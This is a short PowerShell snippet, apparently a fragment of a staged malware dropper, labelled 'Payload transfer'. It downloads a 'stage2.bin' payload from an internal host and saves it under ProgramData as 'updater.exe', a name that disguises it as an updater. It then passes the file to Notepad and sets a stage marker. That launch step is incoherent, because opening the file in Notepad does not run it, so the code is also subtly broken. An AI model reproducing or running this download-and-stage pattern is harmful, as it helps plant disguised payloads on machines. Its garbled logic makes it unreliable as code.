
# Payload transfer
$FetchUrl = "http://internal.corp/stage2.bin"
$DownloadPath = 'C:\ProgramData\updater.exe'
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $DownloadPath)
Start-Process -FilePath "notepad.exe" -ArgumentList $DownloadPath
$StageMarker = "stage-19"
